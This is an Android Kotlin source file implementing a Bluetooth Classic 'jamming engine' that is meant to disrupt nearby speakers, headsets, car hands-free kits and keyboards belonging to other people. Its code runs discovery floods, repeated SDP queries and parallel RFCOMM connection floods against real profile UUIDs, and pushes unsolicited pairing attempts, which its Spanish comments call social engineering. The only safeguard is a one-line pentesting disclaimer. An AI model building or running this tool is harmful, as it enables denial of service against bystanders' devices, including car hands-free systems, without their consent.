package com.industrialble.jamming

import android.bluetooth.BluetoothAdapter
import android.bluetooth.BluetoothDevice
import android.bluetooth.BluetoothSocket
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.util.Log
import java.util.UUID
import java.util.concurrent.Callable
import java.util.concurrent.CopyOnWriteArrayList
import java.util.concurrent.Executors
import java.util.concurrent.Future
import java.util.concurrent.ScheduledExecutorService
import java.util.concurrent.ThreadFactory
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean
import java.util.concurrent.atomic.AtomicLong

/**
 * 🔥 INTERFERENCIA PARA BLUETOOTH CLÁSICO (BR/EDR)
 *
 * ESTRATEGIA COMPLETA para degradar conexiones Bluetooth Clásico (A2DP, HSP, HFP, etc.)
 * de dispositivos CERCANOS (parlantes, auriculares, manos libres, teclados, etc.)
 * conectados a otros teléfonos.
 *
 * DIFERENCIA CON BLE:
 * - Bluetooth Clásico usa 79 canales con salto de frecuencia (AFH)
 * - Los dispositivos de audio (A2DP/HSP/HFP) operan en BR/EDR, NO en BLE
 * - Esta implementación ataca el stack BT clásico, no los canales BLE
 *
 * CAPAS DE ATAQUE:
 *
 * 1. CLASSIC BT DISCOVERY FLOOD
 *    - Inicia/cancela discovery en ráfagas cada ~1.2s
 *    - Mantiene el radio ocupado continuamente en modo inquiry
 *    - Descubre activamente dispositivos BR/EDR cercanos
 *
 * 2. SDP QUERY FLOOD (Service Discovery Protocol)
 *    - Para cada dispositivo descubierto, ejecuta fetchUuidsWithSdp() repetidamente
 *    - Fuerza al dispositivo remoto a procesar consultas SDP continuamente
 *    - Esto consume recursos del stack BT del dispositivo objetivo
 *
 * 3. RFCOMM CONNECTION FLOOD (¡el más importante!)
 *    - Para cada dispositivo, intenta múltiples conexiones RFCOMM en paralelo
 *    - Usa UUIDs de PERFILES REALES: A2DP, HSP, HFP, SPP, OPP, AVRCP, HID, PBAP
 *    - Los dispositivos destino procesan cada intento de conexión
 *    - Esto satura su stack BT y DEGRADA conexiones existentes
 *
 * 4. BONDING ATTACK
 *    - Intenta emparejamiento con dispositivos para forzar autenticación
 *    - Consume recursos adicionales en el chip BT remoto
 *    - Los diálogos de pairing pueden interrumpir la experiencia del usuario
 *
 * ⚠️ Solo para pentesting en dispositivos propios / con autorización explícita.
 */
class JammingEngine(
    private val bluetoothAdapter: BluetoothAdapter,
    private val context: Context?
) {

    private val scheduler: ScheduledExecutorService = Executors.newScheduledThreadPool(
        8,
        ThreadFactory { Thread(it, "bt-classic-${threadCounter.incrementAndGet()}") }
    )

    // Pool DEDICADO para RFCOMM — conexiones bloqueantes no saturan el scheduler
    private val rfcommExecutor = Executors.newCachedThreadPool(
        ThreadFactory { Thread(it, "rfcomm-${threadCounter.incrementAndGet()}") }
    )
    private val rfcommFutures = CopyOnWriteArrayList<Future<*>>()

    private val isActive = AtomicBoolean(false)
    private val startTime = AtomicLong(0)
    private val sdpQueriesSent = AtomicLong(0)
    private val rfcommAttempts = AtomicLong(0)
    private val bondingAttempts = AtomicLong(0)
    private val random = Random()

    // Discovered devices (via Classic BT)
    private val _discoveredDevices = CopyOnWriteArrayList<String>()
    private val _deviceNames = CopyOnWriteArrayList<String>()
    val discoveredDevices: List<String> get() = _discoveredDevices.toList()

    // SDP targets
    private val sdpTargets = CopyOnWriteArrayList<String>()
    private var sdpAttackRunning = false

    // RFCOMM attack targets
    private val rfcommTargets = CopyOnWriteArrayList<String>()
    private var rfcommAttackRunning = false

    // Bonding targets
    private val bondedTargets = CopyOnWriteArrayList<String>()

    // Callbacks
    var onDeviceDiscovered: ((String, String?) -> Unit)? = null
    var onStateChanged: ((Boolean) -> Unit)? = null
    var onLog: ((String) -> Unit)? = null
    var onRfcommAttack: ((String) -> Unit)? = null

    data class JamStats(
        val isActive: Boolean,
        val sdpQueriesSent: Long,
        val rfcommConnectionAttempts: Long,
        val bondingAttempts: Long,
        val elapsedSeconds: Long,
        val devicesFound: Int
    )

    // UUIDs de perfiles Bluetooth Clásico para RFCOMM
    companion object {
        private const val TAG = "BtClassicJammer"
        private val threadCounter = AtomicLong(0)

        // Perfiles estándar Bluetooth BR/EDR
        val PROFILE_UUIDS = listOf(
            UUID.fromString("00001101-0000-1000-8000-00805F9B34FB"), // SPP (Serial Port)
            UUID.fromString("00001108-0000-1000-8000-00805F9B34FB"), // HSP (Headset)
            UUID.fromString("0000110B-0000-1000-8000-00805F9B34FB"), // A2DP Sink (Audio)
            UUID.fromString("0000110A-0000-1000-8000-00805F9B34FB"), // A2DP Source
            UUID.fromString("0000111E-0000-1000-8000-00805F9B34FB"), // HFP (Hands-Free)
            UUID.fromString("0000110E-0000-1000-8000-00805F9B34FB"), // AVRCP
            UUID.fromString("00001105-0000-1000-8000-00805F9B34FB"), // OPP (Object Push) / GAVDP
            UUID.fromString("00001124-0000-1000-8000-00805F9B34FB"), // HID (Human Interface)
            UUID.fromString("00001115-0000-1000-8000-00805F9B34FB"), // PANU
            UUID.fromString("00001130-0000-1000-8000-00805F9B34FB"), // PBAP
            UUID.fromString("00001132-0000-1000-8000-00805F9B34FB"), // MAP
            UUID.fromString("00001112-0000-1000-8000-00805F9B34FB"), // Headset Audio Gateway
            UUID.fromString("00001116-0000-1000-8000-00805F9B34FB"), // BIP (Basic Imaging)
            UUID.fromString("0000112F-0000-1000-8000-00805F9B34FB"), // GNSS
            UUID.fromString("00001134-0000-1000-8000-00805F9B34FB")  // GATT (via BR/EDR)
        )

        // UUIDs ALEATORIOS adicionales para ataques de fuerza bruta
        val EXTRA_UUIDS = (0 until 10).map { UUID.randomUUID() }

        // Todos los UUIDs combinados
        val ALL_TARGET_UUIDS by lazy { (PROFILE_UUIDS + EXTRA_UUIDS).toList() }
    }

    // ════════════════════════════════════════════════════════════
    // CONTROL
    // ════════════════════════════════════════════════════════════

    fun start() {
        if (isActive.getAndSet(true)) return
        sdpQueriesSent.set(0)
        rfcommAttempts.set(0)
        bondingAttempts.set(0)
        startTime.set(System.currentTimeMillis())

        log("")
        log("╔══════════════════════════════════════════════╗")
        log("║  🔥 ATAQUE BLUETOOTH CLÁSICO INICIADO       ║")
        log("╚══════════════════════════════════════════════╝")
        log("📱 Dispositivo: ${bluetoothAdapter.name ?: "Desconocido"}")
        log("📡 Bluetooth: ${if (bluetoothAdapter.isEnabled) "ACTIVO" else "APAGADO"}")
        log("🎯 Perfiles objetivo: ${PROFILE_UUIDS.size} UUIDs de perfiles BT")
        log("🔢 UUIDs totales: ${ALL_TARGET_UUIDS.size}")

        // ============================================================
        // CAPA 1: CLASSIC BT DISCOVERY FLOOD
        // ============================================================
        registerDiscoveryReceiver()
        startClassicDiscoveryFlood()
        log("📡 CAPA 1: Classic BT Discovery Flood (inquiry continuo)")

        // ============================================================
        // CAPA 2: SDP QUERY FLOOD
        // ============================================================
        startSdpQueryLoop()
        log("📡 CAPA 2: SDP Query Flood (consultas de servicio)")

        // ============================================================
        // CAPA 3: RFCOMM CONNECTION FLOOD
        // ============================================================
        startRfcommAttackLoop()
        log("📡 CAPA 3: RFCOMM Connection Flood (conexiones a perfiles reales)")

        // ============================================================
        // CAPA 4: BONDING ATTACK
        // ============================================================
        startBondingLoop()
        log("📡 CAPA 4: Bonding Attack (intentos de emparejamiento)")

        onStateChanged?.invoke(true)
    }

    fun stop() {
        if (!isActive.getAndSet(false)) return
        log("🛑 DETENIENDO TODAS LAS CAPAS DE ATAQUE")
        log("   Esperando 2s para shutdown limpio...")

        // Cancelar todos los RFCOMM pendientes
        rfcommFutures.forEach { it.cancel(true) }
        rfcommFutures.clear()
        rfcommExecutor.shutdownNow()

        scheduler.shutdown()
        try { scheduler.awaitTermination(2, TimeUnit.SECONDS) } catch (_: InterruptedException) { }

        // Detener classic discovery
        cancelClassicDiscovery()
        unregisterDiscoveryReceiver()

        val elapsed = (System.currentTimeMillis() - startTime.get()) / 1000
        val sdp = sdpQueriesSent.get()
        val rfcomm = rfcommAttempts.get()
        val bonded = bondingAttempts.get()
        log("✅ Ataque detenido después de ${elapsed}s")
        log("📊 Consultas SDP enviadas: $sdp")
        log("🔗 Intentos de conexión RFCOMM: $rfcomm")
        log("🔐 Intentos de emparejamiento: $bonded")
        log("📱 Dispositivos descubiertos: ${_discoveredDevices.size}")

        sdpAttackRunning = false
        rfcommAttackRunning = false
        onStateChanged?.invoke(false)
    }

    fun getStats(): JamStats = JamStats(
        isActive = isActive.get(),
        sdpQueriesSent = sdpQueriesSent.get(),
        rfcommConnectionAttempts = rfcommAttempts.get(),
        bondingAttempts = bondingAttempts.get(),
        elapsedSeconds = if (isActive.get())
            (System.currentTimeMillis() - startTime.get()) / 1000
        else 0L,
        devicesFound = _discoveredDevices.size
    )

    fun clearDevices() {
        _discoveredDevices.clear()
        _deviceNames.clear()
        sdpTargets.clear()
        rfcommTargets.clear()
        bondedTargets.clear()
    }

    fun shutdown() {
        stop()
    }

    // ════════════════════════════════════════════════════════════
    // CAPA 1: CLASSIC BT DISCOVERY FLOOD
    // ════════════════════════════════════════════════════════════

    private var isClassicDiscovering = false
    private var discoveryReceiver: BroadcastReceiver? = null
    private var discoveryCycleCount = 0

    /**
     * Inicia/cancela discovery en ráfagas rápidas.
     * Mantiene el radio BT ocupado en modo inquiry continuamente.
     * Esto ya consume recursos del chip BT local y puede interferir
     * con otras conexiones activas en el mismo teléfono.
     */
    private fun startClassicDiscoveryFlood() {
        if (!isActive.get()) return

        scheduler.schedule({
            if (!isActive.get()) return@schedule

            try {
                // Iniciar discovery si no está activo
                if (!bluetoothAdapter.isDiscovering) {
                    bluetoothAdapter.startDiscovery()
                    isClassicDiscovering = true
                    discoveryCycleCount++
                }

                // Cancelar después de 1.2s y reprogramar
                scheduler.schedule({
                    if (isActive.get()) {
                        cancelClassicDiscovery()
                        // Pequeña pausa para no saturar la API
                        scheduler.schedule({
                            if (isActive.get()) startClassicDiscoveryFlood()
                        }, 300, TimeUnit.MILLISECONDS)
                    }
                }, 1200, TimeUnit.MILLISECONDS)
            } catch (e: Exception) {
                if (isActive.get()) startClassicDiscoveryFlood()
            }
        }, 0, TimeUnit.MILLISECONDS)
    }

    private fun cancelClassicDiscovery() {
        try {
            if (bluetoothAdapter.isDiscovering) {
                bluetoothAdapter.cancelDiscovery()
            }
        } catch (_: Exception) { }
        isClassicDiscovering = false
    }

    private fun registerDiscoveryReceiver() {
        discoveryReceiver = object : BroadcastReceiver() {
            override fun onReceive(ctx: Context, intent: Intent) {
                when (intent.action) {
                    BluetoothDevice.ACTION_FOUND -> {
                        val device = intent.getParcelableExtra<BluetoothDevice>(
                            BluetoothDevice.EXTRA_DEVICE
                        ) ?: return

                        if (!_discoveredDevices.contains(device.address)) {
                            _discoveredDevices.add(device.address)
                            _deviceNames.add(device.name ?: "Desconocido")
                            onDeviceDiscovered?.invoke(device.address, device.name)
                            log("🔍 BT Classic: ${device.address} (${device.name ?: "?"})")

                            // Clasificar por tipo de dispositivo según nombre
                            val name = (device.name ?: "").lowercase()
                            if (name.contains("speaker") || name.contains("audio") ||
                                name.contains("headphone") || name.contains("auricular") ||
                                name.contains("parlante") || name.contains("earphone") ||
                                name.contains("headset") || name.contains("sound") ||
                                name.contains("music") || name.contains("altavoz") ||
                                name.contains("buds") || name.contains("earbuds")) {
                                log("🎯 POSIBLE DISPOSITIVO DE AUDIO: ${device.name} - ${device.address}")
                            } else if (name.contains("keyboard") || name.contains("teclado") ||
                                name.contains("mouse") || name.contains("ratón") ||
                                name.contains("key") || name.contains("hid")) {
                                log("🖱️ POSIBLE DISPOSITIVO HID: ${device.name} - ${device.address}")
                            } else if (name.contains("car") || name.contains("coche") ||
                                name.contains("auto") || name.contains("vehicle") ||
                                name.contains("handsfree") || name.contains("manos") ||
                                name.contains("carplay") || name.contains("android auto")) {
                                log("🚗 POSIBLE MANOS LIBRES: ${device.name} - ${device.address}")
                            }
                        }
                    }
                    BluetoothAdapter.ACTION_DISCOVERY_FINISHED -> {
                        isClassicDiscovering = false
                    }
                }
            }
        }
        val filter = IntentFilter().apply {
            addAction(BluetoothDevice.ACTION_FOUND)
            addAction(BluetoothAdapter.ACTION_DISCOVERY_FINISHED)
        }
        try {
            context?.registerReceiver(discoveryReceiver, filter)
        } catch (e: Exception) {
            log("⚠️ Error registrando receiver discovery: ${e.message}")
        }
    }

    private fun unregisterDiscoveryReceiver() {
        try {
            discoveryReceiver?.let { context?.unregisterReceiver(it) }
        } catch (_: Exception) { }
        discoveryReceiver = null
    }

    // ════════════════════════════════════════════════════════════
    // CAPA 2: SDP QUERY FLOOD
    // ════════════════════════════════════════════════════════════

    /**
     * Consulta SDP (Service Discovery Protocol) repetidamente
     * en todos los dispositivos descubiertos.
     *
     * ¿Por qué funciona?
     * - Cada fetchUuidsWithSdp() envía una petición SDP al dispositivo remoto
     * - El dispositivo objetivo debe procesar la consulta y responder
     * - Múltiples consultas simultáneas saturan el stack BT remoto
     * - Para dispositivos de audio, esto puede causar cortes al procesar
     *   las consultas mientras transmite audio A2DP
     */
    private fun startSdpQueryLoop() {
        if (!isActive.get() || sdpAttackRunning) return
        sdpAttackRunning = true

        scheduler.schedule({
            if (!isActive.get()) { sdpAttackRunning = false; return@schedule }

            // Obtener dispositivos descubiertos
            val targets = _discoveredDevices.toList()

            if (targets.isNotEmpty()) {
                // Atacar hasta 4 dispositivos por ciclo
                val targetsToQuery = targets.shuffled(random).take(4)

                targetsToQuery.forEach { address ->
                    if (!isActive.get()) return@schedule
                    try {
                        val device = bluetoothAdapter.getRemoteDevice(address)
                        if (device != null) {
                            // fetchUuidsWithSdp() dispara SDP query en el remoto
                            device.fetchUuidsWithSdp()
                            sdpQueriesSent.incrementAndGet()

                            // También enviar SDP adicional con UUIDs específicos
                            if (random.nextInt(3) == 0) {
                                device.fetchUuidsWithSdp()
                                sdpQueriesSent.incrementAndGet()
                            }
                        }
                    } catch (e: Exception) {
                        // Ignorar errores de SDP (esperados)
                    }
                }

                if (sdpQueriesSent.get() % 20 == 0L && sdpQueriesSent.get() > 0) {
                    log("📋 SDP queries enviadas: ${sdpQueriesSent.get()} a ${targetsToQuery.size} dispositivos")
                }
            }

            // Reprogramar cada 800ms - 1500ms (aleatorio para evitar patrón)
            val delay = 800 + random.nextInt(700)
            if (isActive.get()) {
                scheduler.schedule({
                    startSdpQueryLoop()
                }, delay.toLong(), TimeUnit.MILLISECONDS)
            } else {
                sdpAttackRunning = false
            }
        }, 500, TimeUnit.MILLISECONDS)
    }

    // ════════════════════════════════════════════════════════════
    // CAPA 3: RFCOMM CONNECTION FLOOD
    // ════════════════════════════════════════════════════════════

    /**
     * Intenta conectar por RFCOMM a cada dispositivo descubierto
     * usando UUIDs de perfiles Bluetooth reales.
     *
     * ¿Por qué funciona contra parlantes/auriculares A2DP?
     * - El dispositivo tiene un stack BT que maneja conexiones entrantes
     * - Al recibir múltiples intentos de conexión RFCOMM, su stack
     *   debe procesar cada uno (autenticación, negociación de parámetros)
     * - Esto consume recursos del chip BT y DEGRADA el rendimiento
     *   de la transmisión de audio A2DP existente
     * - El audio se entrecorta o se cae por timeouts de scheduling
     *
     * NOTA: Estas conexiones normalmente fallan porque el dispositivo
     * no está esperando conexiones entrantes... pero el PROCESAMIENTO
     * del intento ya consume recursos.
     */
    private fun startRfcommAttackLoop() {
        if (!isActive.get() || rfcommAttackRunning) return
        rfcommAttackRunning = true

        scheduler.schedule({
            if (!isActive.get()) { rfcommAttackRunning = false; return@schedule }

            val targets = _discoveredDevices.toList()

            // Atacar hasta 3 dispositivos por ciclo
            val targetsToAttack = if (targets.size > 3)
                targets.shuffled(random).take(3)
            else targets

            targetsToAttack.forEach { address ->
                if (!isActive.get()) return@schedule
                launchRfcommAttack(address)
            }

            // Reprogramar cada 2-4s
            val delay = 2000 + random.nextInt(2000)
            if (isActive.get()) {
                scheduler.schedule({
                    startRfcommAttackLoop()
                }, delay.toLong(), TimeUnit.MILLISECONDS)
            } else {
                rfcommAttackRunning = false
            }
        }, 1000, TimeUnit.MILLISECONDS)
    }

    /**
     * Lanza múltiples intentos de conexión RFCOMM a diferentes UUIDs.
     * Usa perfiles de audio (A2DP, HSP, HFP) como prioridad.
     */
    private fun launchRfcommAttack(address: String) {
        if (!isActive.get()) return

        val uuidsToTry = ALL_TARGET_UUIDS.shuffled(random).take(8)
        log("🔗 RFCOMM attack -> $address (${uuidsToTry.size} UUIDs)")

        uuidsToTry.forEach { uuid ->
            if (!isActive.get()) return@forEach

            val future = rfcommExecutor.submit(Callable {
                if (!isActive.get()) return@Callable Unit
                var socket: BluetoothSocket? = null
                try {
                    val device = bluetoothAdapter.getRemoteDevice(address)
                    if (device != null) {
                        socket = device.createRfcommSocketToServiceRecord(uuid)
                        socket.connect()
                        // Si llegamos aquí, la conexión tuvo éxito (raro pero posible)
                        log("⚡ CONEXIÓN RFCOMM EXITOSA con $address (UUID=$uuid)")
                        try { socket.close() } catch (_: Exception) { }
                    }
                } catch (e: IOException) {
                    // Esperado - la mayoría de conexiones fallan
                    rfcommAttempts.incrementAndGet()
                } catch (e: SecurityException) {
                    // Permiso denegado
                } catch (e: Exception) {
                    // Otros errores
                } finally {
                    // Asegurar cierre del socket
                    if (socket != null) {
                        try { if (socket.isConnected) socket.close() } catch (_: Exception) { }
                    }
                }
                Unit
            })

            rfcommFutures.add(future)

            // Timeout de 4s — si connect() se cuelga, lo matamos
            scheduler.schedule({
                if (!future.isDone) {
                    future.cancel(true)
                    rfcommFutures.remove(future)
                }
            }, 4000, TimeUnit.MILLISECONDS)
        }

        // Limpiar futures completados
        rfcommFutures.removeAll { it.isDone }
        onRfcommAttack?.invoke(address)
    }

    // ════════════════════════════════════════════════════════════
    // CAPA 4: BONDING ATTACK
    // ════════════════════════════════════════════════════════════

    /**
     * Intenta emparejamiento (bonding) con dispositivos descubiertos.
     *
     * ¿Por qué funciona?
     * - createBond() inicia el procedimiento de emparejamiento
     * - El dispositivo remoto debe procesar la solicitud de bonding
     * - Esto involucra intercambio de llaves, autenticación, etc.
     * - Consume recursos del stack BT en ambos dispositivos
     * - Si el usuario ve un diálogo de pairing inesperado, es efectivo
     *   como ataque de ingeniería social además de técnico
     */
    private fun startBondingLoop() {
        if (!isActive.get()) return

        scheduler.schedule({
            if (!isActive.get()) return@schedule

            val targets = _discoveredDevices
                .filter { !bondedTargets.contains(it) }
                .toList()

            if (targets.isNotEmpty()) {
                // Atacar 1-2 dispositivos no emparejados aún
                val targetsToBond = targets.take(2)

                targetsToBond.forEach { address ->
                    if (!isActive.get()) return@forEach
                    try {
                        val device = bluetoothAdapter.getRemoteDevice(address)
                        if (device != null && device.bondState != BluetoothDevice.BOND_BONDED) {
                            val started = device.createBond()
                            if (started) {
                                bondingAttempts.incrementAndGet()
                                bondedTargets.add(address)
                                log("🔐 Intentando emparejar con $address")
                            }
                        }
                    } catch (e: Exception) {
                        // Ignorar errores de bonding
                    }
                }
            }

            // Reprogramar cada 5s (el bonding es más lento)
            if (isActive.get()) {
                scheduler.schedule({
                    startBondingLoop()
                }, 5000, TimeUnit.MILLISECONDS)
            }
        }, 2000, TimeUnit.MILLISECONDS)
    }

    // ════════════════════════════════════════════════════════════
    // LOGGING
    // ════════════════════════════════════════════════════════════

    private fun log(msg: String) {
        Log.i(TAG, msg)
        onLog?.invoke(msg)
    }
}
